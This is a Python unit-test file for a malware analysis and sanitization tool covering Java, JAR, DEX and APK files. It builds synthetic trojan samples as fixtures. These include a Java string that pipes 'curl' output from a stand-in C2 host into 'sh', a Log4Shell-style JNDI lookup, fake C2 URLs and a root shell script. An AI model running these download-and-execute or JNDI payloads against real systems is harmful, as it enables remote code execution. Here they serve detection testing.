"""
Unit tests for Android APK & Dalvik DEX analysis, Java source/bytecode/JAR analysis,
identification disambiguation, and sanitization (CDR).
"""

import io
import struct
import zipfile
import pytest
from pathlib import Path

from app.analyzers.identification import IdentificationAnalyzer
from app.analyzers.apk_analyzer import ApkAnalyzer, AxmlDecoder, DexParser
from app.analyzers.java_analyzer import JavaAnalyzer, JavaClassParser
from app.sanitizers.apk_sanitizer import ApkSanitizer
from app.sanitizers.java_sanitizer import JavaSanitizer
from app.sanitizers.base import SanitizationOptions


def test_java_and_dex_identification(tmp_path: Path):
    """Verify identification correctly classifies Java source, class, jar, dex, and apk."""
    ident = IdentificationAnalyzer()

    # 1. Java Source (.java)
    java_file = tmp_path / "Payload.java"
    java_file.write_text("public class Payload { public static void main(String[] args) {} }")
    res_java = ident.analyze(java_file, "Payload.java", "text/plain")
    assert res_java.data["category"] == "java"
    assert "java" in (res_java.data.get("detected_mime") or "").lower()

    # 2. Java Compiled Bytecode (.class) - 0xCAFEBABE with Java version 52 (Java 8)
    class_bytes = struct.pack(">IHH", 0xCAFEBABE, 0, 52) + b"\x00" * 20
    class_file = tmp_path / "Payload.class"
    class_file.write_bytes(class_bytes)
    res_class = ident.analyze(class_file, "Payload.class", "application/octet-stream")
    assert res_class.data["category"] == "java"
    assert res_class.data.get("detected_mime") == "application/x-java-class"

    # 3. Dalvik Executable (.dex) - dex\n035\x00
    dex_bytes = b"dex\n035\x00" + b"\x00" * 100
    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_bytes)
    res_dex = ident.analyze(dex_file, "classes.dex", "application/octet-stream")
    assert res_dex.data["category"] == "apk"
    assert res_dex.data.get("detected_mime") == "application/x-dex"

    # 4. APK package (.apk) - ZIP with AndroidManifest.xml
    apk_file = tmp_path / "testapp.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00" + b"\x00" * 40)
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 40)
    res_apk = ident.analyze(apk_file, "testapp.apk", "application/octet-stream")
    assert res_apk.data["category"] == "apk"
    assert res_apk.data.get("detected_mime") == "application/vnd.android.package-archive"

    # 5. JAR archive (.jar) - ZIP with META-INF/MANIFEST.MF
    jar_file = tmp_path / "app.jar"
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", b"Manifest-Version: 1.0\r\nMain-Class: com.example.App\r\n")
    res_jar = ident.analyze(jar_file, "app.jar", "application/octet-stream")
    assert res_jar.data["category"] == "java"
    assert res_jar.data.get("detected_mime") == "application/java-archive"


def test_java_source_analysis(tmp_path: Path):
    """Test Java source analyzer on malicious execution vectors."""
    source_code = """
    package com.malicious.payload;
    import java.lang.reflect.Method;
    import sun.misc.Unsafe;

    public class Exploit {
        public static void main(String[] args) throws Exception {
            // Shell command execution
            Runtime.getRuntime().exec("curl -s http://c2.evil.com/drop.sh | sh");
            ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", "whoami");
            
            // JNDI Log4Shell lookup
            new javax.naming.InitialContext().lookup("ldap://evil-ldap.com:1389/Exploit");
            
            // Dynamic Reflection
            Class<?> clazz = Class.forName("com.secret.Payload");
            Method m = clazz.getMethod("execute");
            m.invoke(null);
        }
    }
    """
    java_file = tmp_path / "Exploit.java"
    java_file.write_text(source_code)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(java_file, "Exploit.java", "text/x-java-source")
    assert res.success is True
    data = res.data
    assert data["is_java"] is True
    assert data["java_subtype"] == "source"
    assert len(data["dangerous_apis"]) >= 4

    api_titles = [a["title"] for a in data["dangerous_apis"]]
    assert any("Shell Command Execution" in t for t in api_titles)
    assert any("Subprocess Creation" in t for t in api_titles)
    assert any("Remote JNDI" in t for t in api_titles)
    assert any("Reflection" in t for t in api_titles)

    # Check extracted URLs
    assert any("c2.evil.com" in u for u in data["iocs"]["urls"])
    assert data["risk_score"] >= 60
    assert data["risk_level"] in ("HIGH", "CRITICAL")


def test_jar_archive_analysis(tmp_path: Path):
    """Test JAR archive analyzer detecting Main-Class, Premain Java Agent, all-permissions, and embedded binaries."""
    jar_file = tmp_path / "agent_trojan.jar"
    manifest_content = (
        "Manifest-Version: 1.0\r\n"
        "Main-Class: com.rat.BotClient\r\n"
        "Premain-Class: com.rat.AgentHook\r\n"
        "Permissions: all-permissions\r\n"
        "\r\n"
    )
    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_content)
        zf.writestr("com/rat/BotClient.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34Runtime.getRuntime().exec")
        zf.writestr("com/rat/AgentHook.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x34sun/misc/Unsafe")
        zf.writestr("lib/win32/payload.dll", b"MZ\x90\x00" + b"\x00" * 100)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "agent_trojan.jar", "application/java-archive")
    assert res.success is True
    data = res.data
    assert data["java_subtype"] == "jar"
    assert data["main_class"] == "com.rat.BotClient"
    assert data["premain_class"] == "com.rat.AgentHook"
    assert data["permissions"] == "all-permissions"
    assert len(data["embedded_binaries"]) == 1
    assert "payload.dll" in data["embedded_binaries"][0]

    findings_titles = [f.title for f in res.findings]
    assert any("Premain-Class" in t for t in findings_titles)
    assert any("all-permissions" in t for t in findings_titles)
    assert any("Embedded Native Binaries" in t for t in findings_titles)


def test_standalone_dex_analysis(tmp_path: Path):
    """Test Dalvik Executable (.dex) string table and API detection."""
    # Build minimal valid DEX header
    dex_buf = bytearray(112)
    dex_buf[0:8] = b"dex\n035\x00"
    dex_buf[32:36] = struct.pack("<I", 112)  # file_size = 112
    dex_buf[36:40] = struct.pack("<I", 112)  # header_size = 112
    dex_buf[40:44] = struct.pack("<I", 0x12345678)  # endian_tag

    # Append string containing suspicious API call and C2 URL
    test_str = b"Landroid/telephony/SmsManager;->sendTextMessage https://c2.botnet.cc/beacon"
    dex_buf.extend(test_str)

    dex_file = tmp_path / "classes.dex"
    dex_file.write_bytes(dex_buf)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(dex_file, "classes.dex", "application/x-dex")
    assert res.success is True
    data = res.data
    assert data["is_standalone_dex"] is True
    assert any("SmsManager" in api["api"] for api in data["dex_info"]["detected_apis"])
    assert any("c2.botnet.cc" in u for u in data["iocs"]["urls"])


def test_apk_and_java_sanitizer(tmp_path: Path):
    """Test CDR sanitizers for APK and Java."""
    apk_sanitizer = ApkSanitizer()
    java_sanitizer = JavaSanitizer()

    # 1. APK PDF Dossier Generation
    apk_in = tmp_path / "app.apk"
    apk_in.write_bytes(b"PK\x03\x04" + b"\x00" * 100)
    apk_out = tmp_path / "app_sanitized.pdf"
    apk_opts = SanitizationOptions(convert_to_pdf=True)

    apk_res = apk_sanitizer.sanitize(apk_in, apk_out, apk_opts, original_filename="app.apk")
    assert apk_res.success is True
    assert apk_out.exists()
    assert apk_out.stat().st_size > 0
    # PDF magic
    assert apk_out.read_bytes()[:4] == b"%PDF"

    # 2. Java Source Sanitization (Disarm & Header)
    java_in = tmp_path / "Malicious.java"
    java_in.write_text('Runtime.getRuntime().exec("whoami"); ProcessBuilder pb = new ProcessBuilder();')
    java_out = tmp_path / "Malicious_clean.java"
    java_opts = SanitizationOptions(convert_to_pdf=False)

    j_res = java_sanitizer.sanitize(java_in, java_out, java_opts, original_filename="Malicious.java")
    assert j_res.success is True
    clean_code = java_out.read_text()
    assert "/* [FILESANITIZER_DISARMED_EXECUTION] */" in clean_code
    assert "Runtime.getRuntime().exec" not in clean_code

    # 3. Java PDF Review Dossier
    java_pdf_out = tmp_path / "Malicious.pdf"
    j_pdf_res = java_sanitizer.sanitize(java_in, java_pdf_out, SanitizationOptions(convert_to_pdf=True))
    assert j_pdf_res.success is True
    assert java_pdf_out.exists()
    assert java_pdf_out.read_bytes()[:4] == b"%PDF"


def test_comprehensive_apk_technical_analysis(tmp_path: Path):
    """Test deep technical APK inspection: manifest, permissions, embedded sources, online intel, and security audit."""
    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.bankbot.trojan"
    android:versionCode="201"
    android:versionName="2.0.1">
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <application android:debuggable="true" android:allowBackup="true" android:usesCleartextTraffic="true">
        <activity android:name="com.bankbot.trojan.MainActivity" android:exported="true" />
        <receiver android:name="com.bankbot.trojan.BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""

    apk_file = tmp_path / "sample_banker.apk"
    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 100)
        zf.writestr("assets/root_exploit.sh", "#!/bin/sh\nsu -c 'chmod 777 /data/local/tmp'\n")
        zf.writestr("assets/index.android.bundle", "console.log('App init'); const key = 'AIzaSyD-1234567890123456789012345'; fetch('https://c2.botnet.cc');")
        zf.writestr("res/values/strings.xml", "<resources><string name='app_name'>BankSecure</string></resources>")

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "sample_banker.apk", "application/vnd.android.package-archive")
    assert res.success is True
    data = res.data

    assert data["is_apk"] is True
    assert data["package_name"] == "com.bankbot.trojan"
    assert data["version_code"] == "201"
    assert data["security_flags"]["debuggable"] is True
    assert data["security_flags"]["allowBackup"] is True
    assert data["security_flags"]["usesCleartextTraffic"] is True

    # Check Dangerous Permissions
    dp_names = [p["permission"] for p in data["dangerous_permissions"]]
    assert "android.permission.SEND_SMS" in dp_names
    assert "android.permission.SYSTEM_ALERT_WINDOW" in dp_names

    # Check Exported Components
    assert "com.bankbot.trojan.MainActivity" in data["exported_components"]["activities"]
    assert "com.bankbot.trojan.BootReceiver" in data["exported_components"]["receivers"]

    # Check Embedded Source Files Analysis
    src_files = {s["filename"]: s for s in data["embedded_source_files"]}
    assert "assets/root_exploit.sh" in src_files
    assert src_files["assets/root_exploit.sh"]["danger_level"] in ("malicious", "suspicious")
    assert any("Command Execution" in f for f in src_files["assets/root_exploit.sh"]["suspicious_findings"])

    assert "assets/index.android.bundle" in src_files
    assert src_files["assets/index.android.bundle"]["file_type"] == "javascript"
    assert any("Google API Key" in f for f in src_files["assets/index.android.bundle"]["suspicious_findings"])

    # Check Online Threat Intel URLs
    assert "koodous.com/apks/" in data["online_intel"]["koodous_url"]
    assert "virustotal.com/gui/file/" in data["online_intel"]["virustotal_url"]
    assert "play.google.com/store/apps/details?id=com.bankbot.trojan" in data["online_intel"]["google_play_url"]

    # Check Security Compliance Audit
    audit_checks = {a["check"]: a["status"] for a in data["security_audit"]}
    assert audit_checks.get("Debuggable Mode") == "FAIL"
    assert audit_checks.get("Application Backup") == "WARN"
    assert audit_checks.get("Cleartext Network Traffic") == "FAIL"
    assert audit_checks.get("Screen Overlay Hijacking") == "WARN"

    # Check Risk Score is Elevated
    assert data["risk_score"] >= 60
    assert data["risk_level"] in ("HIGH", "CRITICAL")


def test_apk_network_security_config_and_malicious_apis(tmp_path: Path):
    """Verify Android APK analyzer flags Network Security Config MitM flaws and explains malicious APIs."""
    apk_file = tmp_path / "banking_spyware.apk"

    manifest_xml = """<?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mobile.trojan" android:versionCode="1" android:versionName="1.0">
        <uses-permission android:name="android.permission.SEND_SMS" />
        <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
        <application android:networkSecurityConfig="@xml/network_security_config">
            <activity android:name="com.mobile.trojan.MainActivity" android:exported="true" />
        </application>
    </manifest>
    """

    network_security_config_xml = """<?xml version="1.0" encoding="utf-8"?>
    <network-security-config>
        <base-config cleartextTrafficPermitted="true">
            <trust-anchors>
                <certificates src="system" />
                <certificates src="user" />
            </trust-anchors>
        </base-config>
    </network-security-config>
    """

    # Build a minimal DEX with string table containing malicious APIs
    # Strings: android/telephony/SmsManager;->sendTextMessage, AES/ECB, android/accessibilityservice/AccessibilityService, TrustAllTrustManager
    dex_strings = [
        "Lcom/mobile/trojan/MainActivity;",
        "android/telephony/SmsManager;->sendTextMessage",
        "AES/ECB",
        "android/accessibilityservice/AccessibilityService",
        "TrustAllTrustManager",
        "https://c2.bankingtrojan.cc/api"
    ]
    str_data = b""
    str_offsets = []
    curr_off = 0x70 + len(dex_strings) * 4
    for s in dex_strings:
        encoded = len(s).to_bytes(1, "little") + s.encode("utf-8") + b"\x00"
        str_offsets.append(curr_off + len(str_data))
        str_data += encoded

    header = bytearray(0x70)
    header[0:8] = b"dex\n035\x00"
    struct.pack_into("<I", header, 0x38, len(dex_strings)) # string_ids_size
    struct.pack_into("<I", header, 0x3C, 0x70)             # string_ids_off
    struct.pack_into("<I", header, 0x60, 0x70 + len(dex_strings) * 4 + len(str_data)) # data_off

    string_ids = bytearray()
    for off in str_offsets:
        string_ids += struct.pack("<I", off)

    dex_bytes = bytes(header) + bytes(string_ids) + str_data

    with zipfile.ZipFile(apk_file, "w") as zf:
        zf.writestr("AndroidManifest.xml", manifest_xml)
        zf.writestr("res/xml/network_security_config.xml", network_security_config_xml)
        zf.writestr("classes.dex", dex_bytes)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "banking_spyware.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # 1. Network Security Config Audit
    nsc = data["network_security_config"]
    assert nsc["found"] is True
    assert nsc["cleartext_permitted"] is True
    assert nsc["trusts_user_certs"] is True
    assert any("User CAs Trusted" in f.title for f in res.findings)
    assert any("Cleartext HTTP Permitted" in f.title for f in res.findings)

    # 2. Malicious API Calls Flagged with Explanations
    detected_apis = data["dex_info"]["detected_apis"]
    assert len(detected_apis) >= 3

    sms_api = next((a for a in detected_apis if "SMS" in a["title"]), None)
    assert sms_api is not None
    assert sms_api["severity"] == "critical"
    assert "risk_explanation" in sms_api and len(sms_api["risk_explanation"]) > 20
    assert "remediation" in sms_api and len(sms_api["remediation"]) > 10
    assert sms_api.get("cwe") is not None
    assert sms_api.get("owasp_mobile") is not None

    crypto_api = next((a for a in detected_apis if "ECB" in a["title"]), None)
    assert crypto_api is not None
    assert crypto_api["category"] == "crypto"
    assert "CWE-327" in crypto_api["cwe"]
    assert "M5" in crypto_api["owasp_mobile"]

    # 3. Security Audit Checklist
    audit_dict = {item["check"]: item["status"] for item in data["security_audit"]}
    assert audit_dict.get("User CA Trust Anchors") == "FAIL"
    assert audit_dict.get("Cleartext Network Traffic") == "FAIL"
    assert audit_dict.get("Cryptographic Robustness") == "FAIL"


def test_jar_deep_forensics_and_class_disassembly(tmp_path: Path):
    """Verify JAR archive analysis populates compatibility fields, disassembles classes, and identifies high-risk APIs."""
    jar_file = tmp_path / "trojan_payload.jar"

    manifest_data = "Manifest-Version: 1.0\r\nMain-Class: com.example.TrojanAgent\r\nPermissions: all-permissions\r\n"

    # Minimal compiled class bytes for com/example/TrojanAgent
    # Magic CAFEBABE, Java 8 (version 52)
    # Constant pool with Runtime.exec and AES/ECB strings
    cp_entries = [
        (1, "com/example/TrojanAgent"),             # 1: Utf8
        (7, 1),                                     # 2: Class -> 1
        (1, "java/lang/Object"),                    # 3: Utf8
        (7, 3),                                     # 4: Class -> 3
        (1, "Runtime.getRuntime().exec"),           # 5: Utf8
        (1, "AES/ECB/PKCS5Padding"),                # 6: Utf8
        (1, "https://evil-c2.net/payload"),         # 7: Utf8
    ]

    cp_count = len(cp_entries) + 1
    cp_bytes = bytearray()
    for entry in cp_entries:
        tag = entry[0]
        if tag == 1:
            val = entry[1].encode("utf-8")
            cp_bytes += struct.pack(">BH", tag, len(val)) + val
        elif tag == 7:
            cp_bytes += struct.pack(">BH", tag, entry[1])

    class_header = struct.pack(">IHHH", 0xCAFEBABE, 0, 52, cp_count)
    class_tail = struct.pack(">HHHH", 0x0001, 2, 4, 0) + struct.pack(">HH", 0, 0)
    class_bytes = class_header + bytes(cp_bytes) + class_tail

    with zipfile.ZipFile(jar_file, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", manifest_data)
        zf.writestr("com/example/TrojanAgent.class", class_bytes)

    analyzer = JavaAnalyzer()
    res = analyzer.analyze(jar_file, "trojan_payload.jar", "application/java-archive")

    assert res.success is True
    data = res.data

    assert data["is_java"] is True
    assert data["is_jar"] is True
    assert data["java_subtype"] == "jar"
    assert data["class_count"] == 1
    assert data["classes_count"] == 1
    assert data["main_class"] == "com.example.TrojanAgent"
    assert "com.example" in data["packages"]
    assert "trojan_payload.jar" in data["filename"]

    # Verify code preview has both Manifest and Disassembled class
    assert "META-INF/MANIFEST.MF" in data["manifest_content"] or "Main-Class" in data["manifest_content"]
    assert "Disassembled Entry / Target Class: com/example/TrojanAgent.class" in data["code_preview"]
    assert "public class TrojanAgent extends Object" in data["code_preview"]

    # Verify high risk APIs are flagged and explained
    assert len(data["dangerous_apis"]) >= 2
    api_names = [a["title"] for a in data["dangerous_apis"]]
    assert any("Shell Command Execution" in t for t in api_names)
    assert any("ECB" in t for t in api_names)

    exec_api = next(a for a in data["dangerous_apis"] if "Shell Command Execution" in a["title"])
    assert exec_api.get("risk_explanation") is not None
    assert exec_api.get("remediation") is not None
    assert "CWE-78" in exec_api["cwe"]


def test_apk_evasion_and_asset_entropy(tmp_path: Path):
    """Test multi-DEX parser bomb filtering, package name inference, and encrypted asset detection."""
    apk_file = tmp_path / "packed_malware.apk"

    # Build minimal valid DEX header (112 bytes)
    dummy_dex = bytearray(112)
    dummy_dex[0:8] = b"dex\n035\x00"

    # Build real DEX with classes and a malicious API
    real_dex = bytearray(112)
    real_dex[0:8] = b"dex\n035\x00"
    real_dex.extend(b"Lcom/stealth/trojan/MainActivity; Ldalvik/system/DexClassLoader;->loadClass")

    # High-entropy encrypted payload (simulating encrypted second-stage drop)
    import os
    encrypted_blob = os.urandom(120_000)

    with zipfile.ZipFile(apk_file, "w") as zf:
        # 12 dummy DEX stubs (parser bomb)
        for i in range(12):
            zf.writestr(f"classes000{i:02d}.dex", dummy_dex)
        # Real DEX file
        zf.writestr("classes.dex", real_dex)
        # Encrypted asset payload
        zf.writestr("assets/payload.bin", encrypted_blob)

    analyzer = ApkAnalyzer()
    res = analyzer.analyze(apk_file, "packed_malware.apk", "application/vnd.android.package-archive")

    assert res.success is True
    data = res.data

    # Multi-DEX parser bomb finding
    bomb_finding = next((f for f in res.findings if "Multi-DEX Parser Bomb" in f.title), None)
    assert bomb_finding is not None
    assert bomb_finding.severity == "critical"

    # Encrypted payload finding in assets
    entropy_finding = next((f for f in res.findings if "Encrypted / Packed Second-Stage Payload" in f.title), None)
    assert entropy_finding is not None
    assert entropy_finding.severity == "critical"
    assert "payload.bin" in entropy_finding.title

    # Package inference from Dalvik classes
    assert data["package_name"] == "com.stealth.trojan"



